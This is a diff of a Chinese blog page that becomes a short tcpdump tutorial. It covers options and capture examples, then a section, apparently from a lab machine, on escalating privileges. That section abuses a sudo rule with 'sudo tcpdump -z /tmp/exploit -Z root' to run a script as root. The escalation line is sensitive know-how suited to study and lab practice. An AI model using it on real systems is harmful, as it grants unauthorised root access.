@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>prontosil&#39;s Blog</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="prontosil&#39;s Blog">
+  <title>每天一个Linux命令-tcpdump | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" tcpdump , 提权 ">
+  <meta name="description" content="每天一个Linux命令-tcpdump | prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于我">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -553,12 +553,48 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-每天一个Linux命令-tcpdump" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#prontosil’s-blog"><span class="toc-text">prontosil’s blog</span></a></li></ol>
+        <h1 class="article-title">每天一个Linux命令-tcpdump</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="编程">编程</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">tcpdump</a>
+            
+            <a class="color3">提权</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-06 21:41:34'>2020-02-06 20:33</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:361</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本用法"><span class="toc-text">基本用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用实例"><span class="toc-text">使用实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用tcpdump抓包，再用wireshark查看"><span class="toc-text">使用tcpdump抓包，再用wireshark查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcpdump提权"><span class="toc-text">tcpdump提权</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -571,23 +607,64 @@
     }
 </style>
 </div>
-            <h1 id="prontosil’s-blog"><a href="#prontosil’s-blog" class="headerlink" title="prontosil’s blog"></a>prontosil’s blog</h1><p>2018年11月，我注册了这个域名，同时开始了自己的博客之路</p>
-<p>一开始对于博客保有热情，什么东西都想往上写，更新速度很快，但是毕竟只有三分钟热度，于是中间搁置了一段时间</p>
-<p>2019年上半年经营了一个学期的简书，个人博客就慢慢地长草了</p>
-<p>但是毕竟不甘心，于是我将自己的个人博客定位为安全文章，正值暑假，于是又写了很多文章。</p>
-<p>中间经历了一些波折，导致我博客的源文件都被删去了，只剩下静态资源</p>
-<p>寒假在家没事做，索性将自己过往的文章进行整理，重新设置博客，希望自己能够写出更好的文章。</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul>
+<li>-i 指定网卡接口</li>
+<li>-c 指定数量</li>
+<li>-w 保存的文件名</li>
+<li>-z 指定脚本</li>
+<li>-Z 指定用户</li>
+</ul>
+<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p>
+<pre><code>tcpdump host 210.27.48.1 </code></pre><p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p>
+<pre><code>tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \) </code></pre><p>截获主机hostname发送的所有数据</p>
+<pre><code>tcpdump -i eth0 src host hostname</code></pre><p>监视所有送到主机的数据包</p>
+<pre><code>tcpdump -i eth0 dst host hostname</code></pre><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p>
+<pre><code>tcpdump tcp port 23 and host 210.27.48.1</code></pre><p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p>
+<pre><code>tcpdump udp port 123 </code></pre><h2 id="使用tcpdump抓包，再用wireshark查看"><a href="#使用tcpdump抓包，再用wireshark查看" class="headerlink" title="使用tcpdump抓包，再用wireshark查看"></a>使用tcpdump抓包，再用wireshark查看</h2><pre><code>tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></pre><p>抓取http包</p>
+<pre><code>tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854</code></pre><h2 id="tcpdump提权"><a href="#tcpdump提权" class="headerlink" title="tcpdump提权"></a>tcpdump提权</h2><p>遇到这种情况</p>
+<pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l
+[sudo] password for webdeveloper:
+Matching Defaults entries for webdeveloper on webdeveloper:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-        </article>
-        
-        
+User webdeveloper may run the following commands on webdeveloper:
+    (root) /usr/sbin/tcpdump</code></pre>
+<p>可以用root身份执行tcpdump命令，其中 <code>/tmp/exploit</code> 是想要以root身份执行的脚本</p>
+<pre><code>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><blockquote>
+<p>-z 指定脚本，-Z 指定用户身份</p>
+</blockquote>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>每天一个Linux命令-tcpdump</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">361</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-02-06, 20:33:51</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-06, 21:41:34</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9cc474ce/" title="每天一个Linux命令-tcpdump">http://prontosil.com/posts/9cc474ce/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
     <section id="comments" class="disqus">
     <style> aside.comment-bar { margin: auto 30px; }</style>
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://prontosil.com/';
-            this.page.identifier = 'tags/docker/index.html';
+            this.page.url = 'http://prontosil.com/posts/9cc474ce/';
+            this.page.identifier = 'posts/9cc474ce/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -629,8 +706,15 @@
 </section>
 
 <!-- Add comment count-->
-<span class="disqus-comment-count" style="display: none" data-disqus-identifier="tags/docker/index.html"></span>
-<span class="disqus-comment-count" style="display: none" data-disqus-url=""></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="posts/9cc474ce/"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://prontosil.com/posts/9cc474ce/"></span>
+
+
+
+    
+
+
+
 
     </div>
     <div class="copyright">
